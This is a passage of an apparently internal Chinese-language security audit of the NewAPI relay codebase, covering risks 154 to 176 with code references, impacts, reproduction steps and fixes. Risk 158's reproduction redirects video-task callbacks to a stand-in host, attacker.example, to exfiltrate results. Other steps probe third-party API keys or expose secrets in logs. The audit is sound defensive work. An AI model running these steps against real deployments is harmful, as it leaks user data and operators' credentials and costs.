- 触发条件：管理员或用户希望 token 只允许某个具体模型变体，例如某个固定 thinking budget；渠道能力或价格配置使用通配符模型；token 的 `model_limits` 只能保存逗号分隔字符串，没有区分“原始模型”和“匹配模型”的策略。
- 涉及文件/函数：
  - `middleware/distributor.go:57-77`：正式 relay 分发前读取 `token_model_limit`，并使用 `ratio_setting.FormatMatchingModelName(modelRequest.Model)` 后匹配
  - `setting/ratio_setting/model_ratio.go:730-747`：`FormatMatchingModelName` 把 Gemini thinking budget 和 gizmo 系列折叠为通配符模型
  - `model/channel_satisfy.go:23-29`、`model/channel_satisfy.go:53-61`：渠道能力判断也会从原始模型回退到归一化模型
  - `model/channel_cache.go:106-113`：内存渠道选择同样在找不到原始模型时使用归一化模型
  - `web/default/src/features/keys/components/api-keys-mutate-drawer.tsx:519-536`：前端模型限制只保存模型字符串列表，没有展示匹配/通配语义
  - `controller/user.go:551-574`：key 表单模型来源是用户可用分组下的 enabled models，未额外提示通配符会扩大匹配范围
- 可能后果：运营给 token 配置模型限制时，容易误以为限制的是某个具体模型名；实际后端按通配符匹配，可能让同一家族下更高 thinking budget 或新变体也可被调用，造成成本上限失真。反过来，如果只把具体 budget 模型写入 token 限制，请求时被归一化为通配符后可能被拒绝，造成用户认为“已授权模型仍不可用”的客服问题。
- 复现思路：配置渠道能力包含 `gemini-2.5-pro-thinking-*`，给 token 设置 `model_limits=gemini-2.5-pro-thinking-*`，分别请求 `gemini-2.5-pro-thinking-1024` 和更高 budget 变体，观察都能通过 token 模型限制。再把 token 限制改成具体 `gemini-2.5-pro-thinking-1024`，观察请求被归一化后是否因缺少通配符项而被拒。
- 修复建议：模型限制应保存结构化策略：`exact`、`normalized`、`wildcard` 三类匹配语义分开；前端展示通配符风险并允许管理员禁止用户选择通配符。后端匹配时优先精确匹配，再按显式授权的通配规则匹配，不应把所有 token 限制默认解释为归一化后的通配规则。
- 优先级：P2
- 当前状态：已确认请求端 token 模型限制和渠道能力都会使用归一化模型名；尚未用实际 Gemini thinking budget 配置做端到端复现。

### 风险 154：param override 审计把敏感改写值写入 `logs.other.po`，普通用户可在自己的日志中看到隐藏提示词或消息改写内容

- 标题：`param_override` 命中 `messages/input/instructions/system/contents` 等路径时会记录包含实际 value/from/to 的审计字符串，消费日志把它保存到 `Other.po`；用户查询 `/api/log/self` 时只删除 `admin_info/stream_status`，不会删除或脱敏 `po`
- 影响范围：渠道 `param_override`、系统提示注入、消息重写、模型映射审计、用户消费日志、管理员隐藏提示词、渠道模板和审计数据暴露
- 触发条件：渠道配置了会修改 `messages`、`input`、`instructions`、`system`、`contents`、`systemInstruction`、`service_tier` 等敏感路径的 param override；普通用户完成一次请求并产生消费日志；用户随后调用自己的日志接口或前端日志页查看 `other` 字段。
- 涉及文件/函数：
  - `relay/common/override.go:29-43`：敏感审计前缀包含 `messages/input/instructions/system/contents/systemInstruction/system_instruction` 等正文或提示词字段
  - `relay/common/override.go:205-230`：只要 param override 涉及敏感路径，即使非 debug 模式也启用 `ParamOverrideAudit`
  - `relay/common/override.go:285-293`：`formatParamOverrideAuditValue` 对字符串直接返回原文，对对象直接 JSON 序列化，没有脱敏或长度限制
  - `relay/common/override.go:296-375`：`set/prepend/append/replace/regex_replace/return_error/set_header/pass_headers` 等审计行会拼接实际 value、from、to
  - `relay/common/override_test.go:2199-2271`：测试确认非 debug 模式下修改 `messages/input/instructions/contents/system` 也会记录如 `set instructions = new instruction`、`append contents...` 的实际内容
  - `service/log_info_generate.go:248-304`：`GenerateTextOtherInfo` 调用 `appendParamOverrideInfo`，把 `relayInfo.ParamOverrideAudit` 写入 `other["po"]`
  - `model/log.go:280-324`：`RecordConsumeLog` 把 `params.Other` 持久化到 `logs.other`
  - `model/log.go:69-80`、`model/log.go:465-506`：用户日志格式化只删除 `admin_info` 和 `stream_status`，保留 `po`
  - `controller/log.go:36-55`、`router/api-router.go:311-318`：普通登录用户可通过 `GET /api/log/self` 查询自己的日志
- 可能后果：运营为了风控、品牌或上游兼容在渠道中注入的系统提示、消息前缀、隐藏指令、输入改写模板，可能被最终用户从日志 `other.po` 直接读到。若 param override 中包含内部策略、提示词资产、上游参数模板或调试 header 名称，用户可以据此规避策略、复制提示词或反向构造更有效的绕过请求。审计字符串没有长度限制，也可能让单条日志膨胀，增加日志存储和前端展示风险。
- 复现思路：配置渠道 `param_override` 为 `{"operations":[{"mode":"set","path":"instructions","value":"internal hidden instruction"},{"mode":"append","path":"messages.0.content","value":" internal suffix"}]}`；使用普通用户 token 发起一次成功请求；调用 `/api/log/self?type=2`，查看该消费日志的 `other.po` 是否包含完整 `internal hidden instruction` 或消息改写内容。再确认管理员日志接口和用户日志接口对 `po` 的返回一致性。
- 修复建议：把 `po` 视为管理员审计字段，普通用户日志中默认删除；管理员视图也应只展示路径、操作类型和脱敏摘要，例如 `set instructions = <redacted sha256:... len=...>`。`formatParamOverrideAuditValue` 应统一长度限制和敏感值脱敏，特别是正文、系统提示、header、return_error 等字段。若需要对用户透明展示改写，应由配置显式声明可公开，并把可公开文案与真实内部指令分开存储。
- 优先级：P2
- 当前状态：已确认非 debug 模式也会记录敏感路径的实际改写值，并且用户日志过滤不会移除 `po`；尚未构造本地请求写入日志做端到端复现。

### 风险 158：视频任务 `metadata.callback_url` 可覆盖上游回调地址，普通用户能让 provider 把任务状态和结果推送到任意 URL

- 标题：任务 adaptor 默认把 `callback_url` 置空或不设置，但通用 metadata 反序列化只删除 `model` 字段；Kling、Doubao、Vidu、Hailuo 等请求结构中的 `callback_url` 可被普通用户通过 `metadata` 写入并转发给上游
- 影响范围：视频/异步任务、上游 provider 回调、任务结果 URL、上游任务号、客户素材、运营审计、provider 账号声誉和出站回调成本
- 触发条件：普通用户提交视频任务，并在 JSON 或 multipart 表单 metadata 中携带 `callback_url`；命中的任务渠道请求结构支持该字段；上游 provider 在任务状态变化或完成时会向该 URL 发送回调。
- 涉及文件/函数：
  - `relay/common/relay_info.go:684-695`：`TaskSubmitReq` 接受 `metadata map[string]interface{}`，普通用户可提交
  - `relay/common/relay_info.go:733-746`：`metadata` 支持 JSON 字符串或对象，都会写入 `TaskSubmitReq.Metadata`
  - `relay/common/relay_utils.go:81-118`：multipart 表单中未知字段会进入 `Metadata`
  - `relay/channel/task/taskcommon/helpers.go:16-29`：`UnmarshalMetadata` 只删除 `model`，没有禁止 `callback_url`、`external_task_id` 等回调/归因字段
  - `relay/channel/task/kling/adaptor.go:60-74`：Kling 请求结构包含 `CallbackUrl` 和 `ExternalTaskId`
  - `relay/channel/task/kling/adaptor.go:266-289`：Kling 默认 `CallbackUrl=""`，随后 `UnmarshalMetadata(req.Metadata, &r)` 可覆盖默认值
  - `relay/channel/task/doubao/adaptor.go:43-55`：Doubao 请求结构包含 `CallbackURL`、`service_tier`、`generate_audio`、`tools` 等 metadata 可写字段
  - `relay/channel/task/doubao/adaptor.go:270-291`：Doubao 构建 `requestPayload` 后直接应用 `UnmarshalMetadata`
  - `relay/channel/task/vidu/adaptor.go:30-40`、`relay/channel/task/vidu/adaptor.go:227-240`：Vidu 请求结构包含 `CallbackUrl`，metadata 可覆盖
  - `relay/channel/task/hailuo/models.go:8-18`、`relay/channel/task/hailuo/adaptor.go:145-166`：Hailuo `VideoRequest` 包含 `CallbackURL`，`req.UnmarshalMetadata` 会写入
- 可能后果：用户可让上游 provider 把任务完成事件、上游任务号、结果 URL、失败原因或原始响应推送到攻击者控制的地址，绕过 NewAPI 的任务查询鉴权、token 隔离、日志脱敏和结果代理策略。即使后续修复了本地 `result_url` 直接暴露，provider 回调仍可能把签名结果 URL 或内部状态发出去。若 callback 指向大量外部地址、内网样式地址或第三方 webhook，还可能造成 provider 侧出站探测、垃圾回调、账号风控或运营排障噪声；NewAPI 本地没有记录这些外部回调的送达和失败情况，审计链会断开。
- 复现思路：使用普通 token 向 Kling/Doubao/Vidu/Hailuo 视频任务提交 `metadata={"callback_url":"https://attacker.example/cb"}`，或 multipart 表单增加 `callback_url=https://attacker.example/cb`；抓取 NewAPI 发给上游的请求体，确认 `callback_url` 被保留；任务完成后观察攻击者地址是否收到 provider 回调，回调体是否包含任务 id、状态、结果 URL 或错误信息。
- 修复建议：任务 metadata 应采用 per-provider allowlist，只允许明确安全、已纳入计费和审计的字段；默认禁止 `callback_url`、`external_task_id`、webhook、headers、secret、store、service_tier 等回调/归因/成本字段。若产品确需用户回调，应由 NewAPI 提供自有 webhook 转发：先让 provider 回调 NewAPI 固定地址，再按用户配置的 webhook 做签名、SSRF 校验、限流、脱敏和审计。保存和展示任务 metadata 时也应标记高危字段，避免绕过运营策略。
- 优先级：P2
- 当前状态：已确认多个任务 adaptor 的请求结构支持 `callback_url` 且 metadata 可覆盖默认值；尚未用真实 provider 触发外部回调。

### 风险 164：部署详情原样回显普通 `env_variables` 和 Raw JSON，缺少敏感键脱敏，误放的密钥会在后台明文扩散

- 标题：io.net 部署支持普通 `env_variables` 与 `secret_env_variables` 两套字段，但后端详情接口会原样返回上游 `container_config.env_variables`，classic 详情页逐项展示环境变量值，default 详情页还提供完整 Raw JSON；后端和前端都没有按 `KEY/TOKEN/SECRET/PASSWORD` 等敏感键做统一脱敏
- 影响范围：模型部署详情、容器运行环境变量、上游/模型 API key、registry 或业务凭据、管理员后台、截图/客服排障、日志留存和浏览器本地内存
- 触发条件：管理员或脚本在创建/更新部署时把密钥放入普通 `env_variables`，而不是 `secret_env_variables`；或 io.net 详情响应把某些敏感运行配置合并进 `container_config.env_variables`；任一后台管理员打开部署详情或复制 Raw JSON。
- 涉及文件/函数：
  - `pkg/ionet/types.go:45-53`：创建部署时普通环境变量和 secret 环境变量并存，字段名分别为 `env_variables` 与 `secret_env_variables`
  - `pkg/ionet/types.go:96-102`：部署详情结构 `DeploymentContainerConfig` 只建模 `EnvVariables`、`Entrypoint`、`TrafficPort`、`ImageURL`，没有敏感字段脱敏层
  - `controller/deployment.go:313-340`：`GetDeployment` 把 `details.ContainerConfig` 原样放入响应 `container_config`
  - `web/classic/src/components/table/model-deployments/modals/ViewDetailsModal.jsx:349-370`：classic 详情页把 `details.container_config.env_variables` 的 key 和 value 逐项明文展示
  - `web/default/src/features/models/components/dialogs/view-details-dialog.tsx:109-116`、`258-265`：default 详情页把完整 `details` 序列化为 Raw JSON 展示，没有脱敏
  - `web/default/src/features/models/components/dialogs/create-deployment-drawer.tsx:240-320`：创建表单把 `env_json` 和 `secret_env_json` 分别转换为普通/secret 环境变量，但没有阻止敏感 key 出现在普通 env 中
  - `web/classic/src/components/table/model-deployments/modals/CreateDeploymentModal.jsx:543-595`：classic 创建表单同样把普通 env 和 secret env 分别提交，内置镜像会自动生成 `OLLAMA_API_KEY` 到 secret env，这是正向证据，但自定义 env 仍可误放密钥
- 可能后果：排障时管理员、客服或外包运维打开详情页即可看到普通 env 中的密钥；截图、浏览器复制、Raw JSON、前端错误采集或后台录屏会扩大泄露面。因为系统没有本地 deployment 配置表，事后只能依赖第三方部署详情和人工记忆判断密钥是否曾被展示。若密钥是上游模型 API key、数据库连接串或私有 registry token，泄露后可能造成额外费用、数据访问或供应链投毒。
- 复现思路：在 staging 创建部署时把 `OPENAI_API_KEY=sk-test` 或 `REGISTRY_PASSWORD=x` 放入 `env_json`，不要放入 `secret_env_json`；创建后打开部署详情，观察 classic 页环境变量区域和 default 页 Raw JSON 是否明文显示该值。再检查浏览器网络响应中 `/api/deployments/:id` 的 `container_config.env_variables` 是否未脱敏。
- 修复建议：后端增加部署详情脱敏函数，返回环境变量时默认只返回 key 和 `masked=true`，value 一律省略或按敏感键掩码；如果确需展示普通 env 值，也必须对 key 命中 `KEY/TOKEN/SECRET/PASSWORD/CREDENTIAL/AUTH/COOKIE` 等模式的值强制脱敏。创建/更新接口应拒绝敏感 key 出现在普通 `env_variables`，提示使用 `secret_env_variables`；前端 Raw JSON 必须使用后端脱敏后的对象，不能直接 stringify 原始详情。对 `secret_env_variables` 和 registry secret 只允许写入、轮换和删除，不允许回显。
- 优先级：P2
- 当前状态：已确认普通 `env_variables` 会从后端详情传到前端并明文展示；未确认 `secret_env_variables` 或 `registry_secret` 会被 io.net 详情响应回传，当前类型定义也没有直接建模这两个字段。

### 风险 167：io.net 测试连接接口只需 AdminAuth 且接受任意 `api_key`，可作为第三方密钥验证 oracle 和外联代理

- 标题：`POST /api/deployments/settings/test-connection` 和 `POST /api/deployments/test-connection` 位于 deployment 管理路由下，只要求 AdminAuth；请求体可携带任意 `api_key`，后端会用该 key 构造 io.net Enterprise client 并向第三方 API 发起 `GET /hardware/max-gpus-per-container`。这不会保存 key，但会让普通管理员通过 NewAPI 后端验证任意 io.net key 是否有效，并把第三方错误信息回显给前端
- 影响范围：io.net API key 管理、管理员权限边界、第三方 API 调用配额、外联审计、错误信息暴露、密钥有效性探测、部署配置安全
- 触发条件：攻击者或低权限运营账号具备 NewAPI Admin 权限但不具备 Root 权限；其向测试连接接口提交任意 `api_key`；后端网络可访问 io.net Enterprise API；接口缺少单独的 Root/step-up/rate limit/audit 约束。
- 涉及文件/函数：
  - `router/api-router.go:381-390`：`/api/deployments` 组使用 `middleware.AdminAuth()`，其中同时注册 `/settings/test-connection` 和 `/test-connection`
  - `controller/deployment.go:58-88`：`TestIoNetConnection` 解析请求体中的 `api_key`；为空时才读取本地 `model_deployment.ionet.api_key`，非空时直接使用用户提交值
  - `controller/deployment.go:87-99`：用提交的 key 创建 `ionet.NewEnterpriseClient(apiKey)` 并调用 `GetMaxGPUsPerContainer()`，失败时将 io.net APIError message 回显
  - `pkg/ionet/client.go:98-157`：`makeRequest` 把 `X-API-KEY` 设置为 client 内的 key，并把第三方错误响应解析为 `APIError`
  - `pkg/ionet/hardware.go:58-70`：`GetMaxGPUsPerContainer` 发起 `GET /hardware/max-gpus-per-container`
  - `web/default/src/features/models/api.ts:305-342`：default 前端封装测试连接接口，`testDeploymentConnectionWithKey` 会把输入框中的 key 发送到 `/api/deployments/settings/test-connection`
  - `web/default/src/features/system-settings/integrations/ionet-deployment-settings-section.tsx:114-128`：点击 Test Connection 时读取当前表单 `apiKey` 并提交测试
  - `web/classic/src/pages/Setting/Model/SettingModelDeployment.jsx:57-81`：classic 前端同样把输入的 `api_key` 提交给测试连接接口
- 可能后果：普通 Admin 可以把 NewAPI 后端当作 io.net key 有效性探测器，枚举或验证来源不明的第三方 key；接口错误信息可能暴露 key 状态、项目权限、配额或账号限制等运营敏感信息。若没有专门限流和审计，大量测试请求会消耗 io.net API 配额、污染第三方安全日志，并让平台外联行为归因到 NewAPI 服务器。该风险不会直接保存或泄露本地已配置 key，但会扩大“只应由 Root 管理第三方凭据”的边界。
- 复现思路：在 staging 用一个非 Root 但具备 Admin 权限的账号调用 `POST /api/deployments/settings/test-connection`，分别提交空 body、明显无效 key 和自有测试 io.net key；观察空 body 是否读取已保存 key、非空 body 是否无须 Root 即触发第三方请求，并比较返回 message 是否能区分 key 缺失、无效、权限不足和连接成功。不要使用生产 key 或他人 key。
- 修复建议：测试连接接口应与保存 io.net key 的 `/api/option` 保持同级敏感度，至少要求 RootAuth 或一次性 step-up；如果要允许 Admin 测试，只允许测试已保存 key，不接受任意请求体 `api_key`。对提交 key 的测试增加严格 rate limit、管理日志、调用目的记录和统一错误信息，避免回显第三方原始错误。前端“未保存前测试”可以改为 Root-only 功能，或使用短期加密草稿凭据并绑定当前 Root 会话。服务端应区分“测试已保存配置”和“测试新凭据”两个接口，后者禁止普通 Admin 访问。
- 优先级：P2
- 当前状态：已确认保存配置走 `/api/option` 的 RootAuth，`GetOptions` 会过滤 `api_key` 且 settings 接口只返回 configured boolean；新增风险仅限测试连接接口接受任意 key 并以 AdminAuth 发起第三方读取请求。尚未验证 io.net 是否对 `max-gpus-per-container` 计费或限流。

### 风险 168：资金来源回退时 token 预扣回滚失败后仍继续尝试备用资金来源，有限 token 可能被重复扣减或账实漂移

- 标题：`BillingSession.preConsume` 会先预扣 token 额度，再预扣钱包或订阅资金来源；当首选资金来源预扣失败时，它只 best-effort 调用 `IncreaseTokenQuota` 回滚 token，回滚失败只写 `SysLog`，随后 `NewBillingSession` 在 `wallet_first/subscription_first` 下仍会尝试备用资金来源并再次预扣 token
- 影响范围：有限额度 token、钱包/订阅资金来源回退、token remain/used 统计、用户请求失败/成功边界、Redis token 缓存、BatchUpdate 队列、客服对账
- 触发条件：用户计费偏好为 `subscription_first` 或 `wallet_first`；首选资金来源在 token 已预扣后返回 `ErrorCodeInsufficientUserQuota`，例如订阅额度不足或钱包不足；token 回滚 `IncreaseTokenQuota` 因 DB/Redis/批量队列异常、token 删除、缓存漂移或更新失败未真正恢复；随后备用资金来源成功并再次预扣同一 token 额度。
- 涉及文件/函数：
  - `service/billing_session.go:198-204`：预扣资金来源前先调用 `PreConsumeTokenQuota`，并记录 `s.tokenConsumed`
  - `service/billing_session.go:207-221`：资金来源预扣失败时调用 `model.IncreaseTokenQuota` 回滚 token；回滚失败只写 `common.SysLog`，仍返回资金来源不足错误
  - `service/billing_session.go:401-431`：`wallet_first` 和 `subscription_first` 在首选路径返回 `ErrorCodeInsufficientUserQuota` 时继续尝试另一种资金来源
  - `service/quota.go:382-404`：`PreConsumeTokenQuota` 对非 playground token 先查 remain，再调用 `DecreaseTokenQuota`
  - `model/token.go:375-392`、`model/token.go:405-422`：token 增减可能走 Redis 异步更新或 BatchUpdate 队列；调用方无法确认缓存和批量落库已经完成
- 可能后果：同一次请求的首选资金来源失败后，有限 token 可能被扣一次失败尝试、再被扣一次成功备用尝试；用户钱包或订阅只扣一次，但 token remain/used 显示双倍消耗。反向情况下，如果回滚异步延迟与第二次预扣乱序，也可能短时间显示 token 额度异常，影响后续限额判断、dashboard billing 和客服对账。由于失败只写系统日志，没有 requestId 级 token 预扣流水，后续难以自动补偿。
- 复现思路：构造有限额度 token、用户同时有一个额度不足的订阅和足够的钱包，偏好为 `subscription_first`；让订阅预扣失败并在 `IncreaseTokenQuota` 回滚处注入错误或模拟 token 更新失败；观察 `NewBillingSession` 是否继续走钱包并再次扣 token，最终 token remain/used 是否比实际资金来源消费多扣。不要在生产 token 上做故障注入。
- 修复建议：资金来源回退前必须确认 token 回滚成功；如果 token 回滚失败，应中止请求并写入 `pending_token_rollback` 补偿记录，不能继续尝试备用资金来源。更稳妥的是把 token 预扣移到资金来源选择成功之后，或为 token 预扣建立 requestId 幂等流水，使首选失败、备用成功、退款和结算都按同一 token 预扣记录做状态机迁移。`IncreaseTokenQuota/DecreaseTokenQuota` 应检查 DB `RowsAffected` 并把 Redis/BatchUpdate 异步失败纳入可观测补偿队列。
- 优先级：P2
- 当前状态：已确认预扣阶段存在“token 先扣、资金来源失败后 best-effort 回滚、随后备用资金来源可再次扣 token”的控制流；尚未做故障注入验证回滚失败后的实际 token drift。

### 风险 170：后台渠道测试会真实调用上游但不走 BillingSession/余额扣费和渠道成本统计，Admin 可放大第三方额度消耗且账单口径缺失

- 标题：`/api/channel/test/:id` 和 `/api/channel/test` 使用真实渠道 key 向上游发送 chat、responses、embedding、rerank、image generation 等测试请求；成功后只写“模型测试”消费日志，不扣测试用户余额、不更新用户/渠道 used_quota，也不进入统一 BillingSession 账务状态
- 影响范围：渠道测试、自动全量渠道测试、第三方上游额度/账单、渠道成本统计、用户/管理员操作审计、系统日志、上游风控日志、Root/Admin 权限边界
- 触发条件：任意 Admin 调用 `GET /api/channel/test/:id`，可带 `model`、`endpoint_type`、`stream` 参数；或调用 `GET /api/channel/test` 触发全量异步测试；或启用 `monitor_setting.auto_test_channel_enabled`/`CHANNEL_TEST_FREQUENCY` 周期性自动测试。被测渠道类型支持测试且上游成功返回。
- 涉及文件/函数：
  - `router/api-router.go:233-245`：`/api/channel/test` 和 `/api/channel/test/:id` 位于 `AdminAuth` 组，没有 RootAuth 或 SecureVerification
  - `controller/channel-test.go:77-112`：`testChannel` 选择 channel `TestModel` 或首个模型，缺省回退 `gpt-4o-mini`
  - `controller/channel-test.go:114-151`：根据模型名或 `endpoint_type` 选择 `/v1/chat/completions`、`/v1/embeddings`、`/v1/images/generations`、`/v1/rerank`、`/v1/responses`、`/v1/responses/compact`
  - `controller/channel-test.go:699-829`：测试请求会构造真实 prompt/input，例如 `hi`、embedding 输入、rerank 文档和 image prompt `a cute cat`
  - `controller/channel-test.go:433-465`：测试调用直接执行 `adaptor.DoRequest` 和 `adaptor.DoResponse`，即真实打到上游
  - `controller/channel-test.go:497-516`：成功后只 `RecordConsumeLog`，`TokenName` 和 `Content` 为“模型测试”，没有调用 `PreConsumeBilling`、`SettleBilling`、`UpdateUserUsedQuotaAndRequestCount` 或 `UpdateChannelUsedQuota`
  - `controller/channel-test.go:517`：成功响应体会写入 `SysLog`
  - `controller/channel-test.go:896-968`：全量测试会遍历全部非手动禁用渠道，在 goroutine 中逐个真实请求并可能触发自动禁用/启用
  - `setting/operation_setting/monitor_setting.go:10-34`：自动渠道测试默认关闭，但可通过设置或 `CHANNEL_TEST_FREQUENCY` 环境变量开启
- 可能后果：普通 Admin 可以反复触发真实上游模型调用，消耗平台第三方 key 的额度，但这些成本不会反映到用户余额扣费、`users.used_quota`、`channels.used_quota` 或常规成本统计中，只留下“模型测试”日志。若选择 image generation、rerank、responses compact、stream codex 等端点，单次测试成本可能明显高于普通 chat ping；全量测试或定时测试会把成本乘以渠道数量。上游账单和 NewAPI 内部报表会出现差异，运营可能误判渠道利润、自动禁用原因和异常成本来源。响应体进入系统日志还可能保存测试生成内容、上游错误细节或模型输出片段，增加排障日志中的敏感信息面。
- 复现思路：在 staging 创建一个真实计费的测试渠道，使用 Admin 调用 `/api/channel/test/:id?endpoint_type=image_generation` 或普通 chat 测试；检查上游 provider usage 是否出现调用记录，同时本地用户余额、`users.used_quota`、`channels.used_quota` 是否未随测试 quota 更新，只新增“模型测试”消费日志。再触发 `/api/channel/test`，观察是否逐个渠道发起请求。不要在生产渠道或高价模型上做压力测试。
- 修复建议：把渠道测试纳入明确的运营成本账本：至少记录 `channel_test_usage` 或在消费日志中同步更新独立的 channel test used quota，不要混同普通用户消费。高成本端点如 image generation、responses compact、rerank、stream 应要求 RootAuth/二次确认或显式测试预算；全量/定时测试应有频率上限、并发上限、日预算、只测低成本 endpoint 和可观测告警。若需要计入真实渠道成本，应更新 `channels.used_quota` 或单独的 `channels.test_used_quota`；如果不应计费，则改为只做轻量 `/models`/health 检查或 provider 支持的免费 dry-run。系统日志不要记录完整响应体，改为截断、脱敏并关联 test request id。
- 优先级：P2
- 当前状态：已确认渠道测试是真实上游调用，成功后仅写“模型测试”消费日志，不走统一 BillingSession 和 used_quota 统计；尚未对真实 provider 做费用侧复现。

### 风险 175：默认公开的模型性能接口暴露真实分组健康和模型运营画像，可能泄露竞争情报与上游质量策略

- 影响范围：公开 pricing 页面、dashboard performance 卡片、模型详情 performance tab、模型分组命名、上游质量评估、活跃模型热度、渠道/分组运营策略、竞品爬取和异常监控规避。
- 触发条件：站点保持默认 `HeaderNavModules`，或显式配置 pricing 公开访问；攻击者或竞品匿名访问 `/api/perf-metrics/summary` 和 `/api/perf-metrics?model=...`，枚举 pricing 中的模型名并收集 24 小时到 30 天窗口内的模型/分组性能数据。
- 涉及文件/函数：
  - `router/api-router.go:34-38`：`/api/perf-metrics` 和 `/api/perf-metrics/summary` 只受 `HeaderNavModulePublicOrUserAuth("pricing")` 保护，不是 Admin/Root 专用接口。
  - `middleware/header_nav.go:13-31`：`HeaderNavModules` 为空或解析失败时 fallback 为 `Enabled=true, RequireAuth=false`。
  - `middleware/header_nav.go:125-134`：当 pricing 启用且不要求登录时，只调用 `TryUserAuth()`，匿名请求仍可继续。
  - `middleware/header_nav_test.go:125-130`：测试明确覆盖 `HeaderNavModulePublicOrUserAuth("pricing")` 默认允许匿名访问。
  - `web/default/src/features/system-settings/maintenance/config.ts:41-49`：前端默认配置同样把 pricing 设为 `enabled: true, requireAuth: false`。
  - `controller/perf_metrics.go:14-32`：summary 接口读取 `hours` 后调用 `perfmetrics.QuerySummaryAll`，聚合所有 active group 的模型性能。
  - `controller/perf_metrics.go:38-70`：detail 接口接受任意 `model` 和可选 `group`，返回该模型各 active group 的性能序列。
  - `pkg/perf_metrics/metrics.go:27-52`：采样记录使用 `info.OriginModelName` 和 `info.UsingGroup`，数据来自真实 relay 请求路径。
  - `pkg/perf_metrics/metrics.go:65-99` 与 `pkg/perf_metrics/metrics.go:101-164`：查询窗口被限制在最多 30 天，这是正向证据；但返回值仍包含真实延迟、成功率、TPS 和模型活跃性。
  - `pkg/perf_metrics/metrics.go:260-291`：模型详情结果按 group 返回 `avg_ttft_ms/avg_latency_ms/success_rate/avg_tps/series`。
  - `pkg/perf_metrics/types.go:31-43`：`GroupResult` 对外暴露 group 名和每个时间桶的性能指标；`ModelSummary` 的 `RequestCount` 使用 `json:"-"` 隐藏，这是正向证据，summary 不直接返回请求量。
  - `web/default/src/features/performance-metrics/api.ts:22-40`：前端直接调用 `/api/perf-metrics/summary` 和 `/api/perf-metrics`。
  - `web/default/src/features/pricing/components/model-details-performance.tsx:160-184`：模型详情页默认拉取 24 小时性能，并展示每个 group 的性能。
  - `web/default/src/features/dashboard/components/models/performance-overview.tsx:99-104` 与 `web/default/src/features/dashboard/components/overview/performance-health-panel.tsx:71-76`：dashboard 侧也会拉取 summary，扩大该接口的常规曝光面。
- 可能后果：匿名访问者可以持续采集哪些模型有真实流量、哪些分组存在、不同分组的延迟/成功率/TPS 和故障时间段；如果 group 名包含内部供应商、成本层级、区域、线路、VIP/auto 等策略信息，会直接泄露路由和服务质量画像。竞品可以据此判断平台热卖模型、上游稳定性、故障窗口和差异化能力；恶意用户也可以挑选成功率低或抖动高的模型/分组发起投诉、薅赔付或规避风控。
- 复现思路：在未登录状态访问默认公开的 pricing 页面，抓取模型列表后循环请求 `/api/perf-metrics?model=<model>&hours=720`；响应会返回 `groups[].group` 以及各时间桶的 `avg_ttft_ms/avg_latency_ms/success_rate/avg_tps`。再请求 `/api/perf-metrics/summary?hours=720` 可获得哪些模型存在性能数据及聚合健康情况。
- 修复建议：将性能指标拆分为“公开展示版”和“运营内部版”。公开版默认关闭或要求登录，只返回脱敏等级指标，例如快/中/慢、健康/波动，不暴露真实 group 名和时间桶序列；内部版放到 Admin/Root 权限下，并增加 rate limit、最小样本量阈值、模型 allowlist、窗口白名单和审计。若确实要公开，建议隐藏 group 名、移除细粒度 series、按更粗时间窗口聚合，并提供总开关控制 performance tab。
- 优先级：P2。
- 当前状态：未修复。

### 风险 176：性能指标热桶未跨实例合并且默认无限保留，运营看板可能低估当前故障并导致 `perf_metrics` 表长期膨胀

- 影响范围：模型性能看板、pricing performance 展示、dashboard performance health、运维故障判断、模型/分组质量排序、数据库容量、长期公开性能画像。
- 触发条件：多实例部署、Redis 已启用、当前 bucket 尚未 flush 到数据库、实例崩溃或重启、`perf_metrics_setting.retention_days` 保持默认 0、模型/分组数量较多且 bucket 粒度较细。
- 涉及文件/函数：
  - `main.go:306-310`：Redis 初始化后启动 `perfmetrics.Init()`，说明 perf metrics 支持在 Redis 可用环境运行。
  - `pkg/perf_metrics/metrics.go:57-76`：每次采样同时写入进程内 `hotBuckets` 和 `recordRedis(key, sample)`。
  - `pkg/perf_metrics/metrics.go:78-127`：`Query` 查询 detail 时只合并数据库历史行和当前进程的 `hotBuckets`，没有调用 `mergeRedisActiveBuckets`。
  - `pkg/perf_metrics/metrics.go:129-164`：`QuerySummaryAll` 查询 summary 时同样只合并数据库行和当前进程的 `hotBuckets`，没有合并 Redis 中其他实例写入的当前热桶。
  - `pkg/perf_metrics/metrics.go:327-353`：`recordRedis` 会把当前 bucket 累计到 Redis hash，并设置 1 小时 TTL。
  - `pkg/perf_metrics/metrics.go:355-371`：存在 `mergeRedisActiveBuckets`，但本轮搜索只发现定义和内部 helper，没有实际调用；并且该函数要求 `params.Group` 非空，不适用于 summary 或“全部 group”查询。
  - `pkg/perf_metrics/flush.go:13-23`：flush loop 按配置间隔运行，只有在 `setting.Enabled` 为 true 时才 flush 已完成 bucket 并执行清理。
  - `pkg/perf_metrics/flush.go:26-55`：`flushCompletedBuckets` 只 flush 当前进程内 `hotBuckets` 的已完成 bucket；其他实例内存中的热桶只有各自实例 flush 才会入库。
  - `pkg/perf_metrics/flush.go:70-77`：`cleanupExpiredMetrics` 在 `retentionDays <= 0` 时直接返回，不做清理。
  - `setting/perf_metrics_setting/config.go:12-16` 与 `web/default/src/features/system-settings/operations/index.tsx:62-65`：默认 `Enabled=true`、`BucketTime=hour`、`RetentionDays=0`，即默认开启记录但不设置保留期。
  - `web/default/src/features/system-settings/maintenance/performance-section.tsx:87-90`：前端只校验 `retention_days >= 0`，允许继续配置为 0。
  - `model/perf_metric.go:28-48`：落库通过唯一索引 `(model_name, group, bucket_ts)` 和 `ON CONFLICT` 累加，跨实例已完成 bucket 入库本身可累计，这是正向证据。
  - `model/perf_metric.go:89-95`：过期清理仅按 `bucket_ts < cutoff` 删除，依赖上层传入正数保留期。
- 可能后果：当前小时或当前 5 分钟/分钟 bucket 的看板只包含命中当前实例的内存热桶，其他实例的实时请求直到各自 flush 后才进入数据库；若实例在 bucket 完成前崩溃，内存热桶可能直接丢失，Redis 中已有计数也不会被查询或 flush 回库。故障期间运营看板可能低估当前失败率、延迟和 TPS，误判“只有单实例/少量模型异常”。同时默认保留期为 0 会让 `perf_metrics` 表无限增长，模型和 group 多时长期增加数据库体积、公开历史画像和查询成本。
- 复现思路：两实例部署并启用 Redis；在实例 A、B 同时产生同一模型同一 group 的请求，立刻请求实例 A 的 `/api/perf-metrics?model=...`，结果只包含实例 A 内存热桶和已 flush 历史，不合并 Redis 中实例 B 的当前 bucket。再保持 `retention_days=0` 运行，`cleanupExpiredMetrics` 不删除任何旧 `perf_metrics` 行。
